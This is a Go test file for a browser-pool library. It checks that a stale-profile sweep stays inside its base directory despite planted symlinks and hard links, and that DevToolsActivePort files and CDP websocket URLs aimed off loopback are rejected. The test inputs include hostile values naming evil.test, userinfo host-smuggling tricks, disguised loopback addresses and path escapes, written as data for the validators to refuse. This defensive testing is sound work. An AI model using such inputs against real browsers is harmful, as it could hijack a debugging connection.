	for i := 1; i <= 5; i++ {
		l := filepath.Join(base, "t"+pid+"."+strconv.Itoa(i))
		if err := os.Symlink(out.dir, l); err != nil {
			t.Fatal(err)
		}
		links = append(links, l)
	}
	writeFile(t, base, "t"+pid+".6", "a file where an area would go")
	p, err := browser.NewPool(t.Context(), r.config(t, func(n int) bool { return n == os.Getpid() }))
	if err != nil {
		t.Fatalf("NewPool: %v", err)
	}
	defer func() { _ = p.Close() }()
	b, err := p.Launch(ctx(t), connector.LaunchOptions{AllowedDomains: allow})
	if err != nil {
		t.Fatalf("Launch: %v", err)
	}
	pb := b.(*browser.PoolBrowser) //nolint:forcetypeassert // the pool's own type
	r.mu.Lock()
	cmd := r.cmds[0]
	r.mu.Unlock()
	for _, key := range []string{"XDG_CONFIG_HOME", "XDG_CACHE_HOME", "TMPDIR"} {
		v := envValue(cmd.Env, key)
		if v == "" {
			continue
		}
		area := v
		if key != "TMPDIR" {
			area = filepath.Dir(v)
		}
		if filepath.Dir(area) != base || slices.Contains(links, area) || area == filepath.Join(base, "t"+pid+".6") {
			t.Errorf("%s = %s: not a fresh area directly under the base", key, v)
		}
		fi, err := os.Lstat(area)
		if err != nil || !fi.IsDir() || fi.Mode()&fs.ModeSymlink != 0 {
			t.Errorf("area %s is not a real directory: %v %v", area, fi, err)
		}
	}
	if fi, err := os.Lstat(pb.ProfileDir()); err != nil || fi.Mode()&fs.ModeSymlink != 0 || fi.Mode().Perm() != 0o700 {
		t.Errorf("profile %s is not a private real directory", pb.ProfileDir())
	}
	if err := b.Close(); err != nil {
		t.Errorf("Close: %v", err)
	}
	for _, l := range links {
		if fi, err := os.Lstat(l); err != nil || fi.Mode()&fs.ModeSymlink == 0 {
			t.Errorf("pre-planted link %s removed or replaced: %v", l, err)
		}
	}
	out.assertIntact(t)
}

// TestAttack_StaleSweepNeverDeletesOutsideItsParent: stale profiles and
// private areas of a dead pid holding symlinks (to a directory, a file,
// the filesystem root, the base's parent), hard links to outside files,
// FIFOs and deep trees are removed without touching anything outside the
// base; live and unrelated entries stay.
func TestAttack_StaleSweepNeverDeletesOutsideItsParent(t *testing.T) {
	t.Parallel()
	const dead = 999_999_001
	r := newPoolRig(t)
	base := mkPrivate(t, r.xdg, "facto")
	outDir := newOutside(t, r, "outdir")
	outFile := newOutside(t, r, "outfile")
	outHard := newOutside(t, r, "outhard")
	sibling := writeFile(t, r.xdg, "sibling-of-base", "keep")

	mkStale := func(name string) string {
		d := mkPrivate(t, base, name)
		mkPrivate(t, d, "Default")
		writeFile(t, filepath.Join(d, "Default"), "Cookies", "stale")
		for _, l := range []struct{ target, name string }{
			{outDir.dir, "dirlink"},
			{outFile.file, "filelink"},
			{"/", "rootlink"},
			{"..", "dotdot"},
			{"../..", "Default/updotdot"},
			{r.xdg, "Default/xdglink"},
		} {
			if err := os.Symlink(l.target, filepath.Join(d, l.name)); err != nil {
				t.Fatal(err)
			}
		}
		if err := os.Link(outHard.file, filepath.Join(d, "hardlink")); err != nil {
			t.Fatal(err)
		}
		if err := syscall.Mkfifo(filepath.Join(d, "fifo"), 0o600); err != nil {
			t.Fatal(err)
		}
		deep := d
		for i := range 64 {
			deep = mkPrivate(t, deep, "d"+strconv.Itoa(i))
		}
		if err := os.Symlink(outDir.dir, filepath.Join(deep, "deeplink")); err != nil {
			t.Fatal(err)
		}
		return d
	}
	staleProfile := mkStale(fmt.Sprintf("profile-%d-stale", dead))
	staleArea := mkStale(fmt.Sprintf("t%d.3", dead))
	live := mkPrivate(t, base, fmt.Sprintf("profile-%d-live", os.Getpid()))
	unrelated := mkPrivate(t, base, "keep-me")
	weird := []string{
		mkPrivate(t, base, fmt.Sprintf("profile-%d", dead)),
		mkPrivate(t, base, fmt.Sprintf("profile-+%d-x", dead)),
		mkPrivate(t, base, fmt.Sprintf("profile-0%d-", dead)),
		mkPrivate(t, base, fmt.Sprintf("t%d.", dead)),
		mkPrivate(t, base, fmt.Sprintf("t%d.1x", dead)),
		mkPrivate(t, base, fmt.Sprintf("t-%d.1", dead)),
		mkPrivate(t, base, "t0.1"),
	}

	p, err := browser.NewPool(t.Context(), r.config(t, func(n int) bool { return n != dead }))
	if err != nil {
		t.Fatalf("NewPool: %v", err)
	}
	_ = p.Close()

	for _, gone := range []string{staleProfile, staleArea} {
		if _, err := os.Lstat(gone); !errors.Is(err, fs.ErrNotExist) {
			t.Errorf("stale %s not swept: %v", gone, err)
		}
	}
	for _, kept := range append([]string{live, unrelated, sibling, r.xdg, base}, weird...) {
		if _, err := os.Lstat(kept); err != nil {
			t.Errorf("%s removed by the sweep: %v", kept, err)
		}
	}
	for _, o := range []outside{outDir, outFile, outHard} {
		o.assertIntact(t)
	}
	var st syscall.Stat_t
	if err := syscall.Stat(outHard.file, &st); err != nil || st.Nlink != 1 {
		t.Errorf("hard-linked outside file: nlink %d, %v; want 1 (only the stale link removed)", st.Nlink, err)
	}
	if _, err := os.Stat("/"); err != nil {
		t.Fatal("filesystem root gone?")
	}
}

// ------------------------------------------------------------ windows port file

// TestAttack_PortFilePointingOffLoopbackRefused (A4): a planted
// DevToolsActivePort naming another host, a page target or a path escape
// is refused; a listener on any address but 127.0.0.1, or shared with
// another socket, is refused; cdploopback never dials a non-literal
// loopback target.
func TestAttack_PortFilePointingOffLoopbackRefused(t *testing.T) {
	t.Parallel()
	const guid = "0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0"
	for _, data := range []string{
		"0.0.0.0:9222\n/devtools/browser/" + guid,
		"192.0.2.1:9222\n/devtools/browser/" + guid,
		"9222\nws://evil.test:9222/devtools/browser/" + guid,
		"9222\n//evil.test/devtools/browser/" + guid,
		"9222\n/devtools/page/" + guid,
		"9222\n/devtools/browser/" + guid + "/../../json/version",
		"9222\n/devtools/browser/" + guid + "?host=evil.test",
		"9222\n/devtools/browser/../../" + guid[:30],
		"9222\n/devtools/browser/" + strings.ToUpper(guid),
		"9222\r\n/devtools/browser/" + guid,
		" 9222\n/devtools/browser/" + guid,
		"+9222\n/devtools/browser/" + guid,
		"09222\n/devtools/browser/" + guid,
		"0x2406\n/devtools/browser/" + guid,
		"65536\n/devtools/browser/" + guid,
		"0\n/devtools/browser/" + guid,
		"9222\n/devtools/browser/" + guid + "\nextra",
		"\ufeff9222\n/devtools/browser/" + guid,
		"9222\n/devtools/browser/" + guid + "\x00",
		strings.Repeat("9", 300),
	} {
		if tg, err := browser.ParseDevToolsActivePort([]byte(data)); !errors.Is(err, browser.ErrPortFile) {
			t.Errorf("ParseDevToolsActivePort(%q) = %+v, %v; want ErrPortFile", data, tg, err)
		}
	}
	const port, chrome, other = 9222, 4242, 4343
	l := func(addr string, pid int) browser.TCPListener {
		return browser.TCPListener{Addr: netip.AddrPortFrom(netip.MustParseAddr(addr), port), PID: pid}
	}
	for name, rows := range map[string][]browser.TCPListener{
		"wildcard v4":              {l("0.0.0.0", chrome)},
		"wildcard v6":              {l("::", chrome)},
		"v6 loopback":              {l("::1", chrome)},
		"v4-mapped loopback":       {l("::ffff:127.0.0.1", chrome)},
		"other loopback address":   {l("127.0.0.2", chrome)},
		"lan address":              {l("192.0.2.1", chrome)},
		"shared with a wildcard":   {l("127.0.0.1", chrome), l("0.0.0.0", other)},
		"shared with v6 wildcard":  {l("127.0.0.1", chrome), l("::", other)},
		"shared with same pid":     {l("127.0.0.1", chrome), l("::1", chrome)},
		"no owner pid":             {l("127.0.0.1", 0)},
		"negative owner pid":       {l("127.0.0.1", -1)},
		"no listener on that port": {{Addr: netip.MustParseAddrPort("127.0.0.1:9223"), PID: chrome}},
	} {
		if pid, err := browser.LoopbackListenerPID(rows, port); !errors.Is(err, browser.ErrListenerNotBrowser) {
			t.Errorf("%s: LoopbackListenerPID = %d, %v; want ErrListenerNotBrowser", name, pid, err)
		}
	}
	for _, raw := range []string{
		"ws://localhost:9222/devtools/browser/" + guid,
		"ws://127.0.0.1.evil.test:9222/devtools/browser/" + guid,
		"ws://127.1:9222/devtools/browser/" + guid,
		"ws://2130706433:9222/devtools/browser/" + guid,
		"ws://0x7f.0.0.1:9222/devtools/browser/" + guid,
		"ws://[::ffff:127.0.0.1]:9222/devtools/browser/" + guid,
		"ws://[::1]:9222/devtools/browser/" + guid,
		"ws://127.0.0.1:9222@evil.test/devtools/browser/" + guid,
		"ws://evil.test@127.0.0.1:9222/devtools/browser/" + guid,
		"wss://127.0.0.1:9222/devtools/browser/" + guid,
		"http://127.0.0.1:9222/json/version",
		"ws://127.0.0.1:0/devtools/browser/" + guid,
		"ws://127.0.0.01:9222/devtools/browser/" + guid,
		"ws://127.000.000.001:9222/devtools/browser/" + guid,
	} {
		if tg, err := cdploopback.ParseTarget(raw); err == nil {
			t.Errorf("cdploopback.ParseTarget(%q) = %+v, want refused", raw, tg)
		}
	}
}
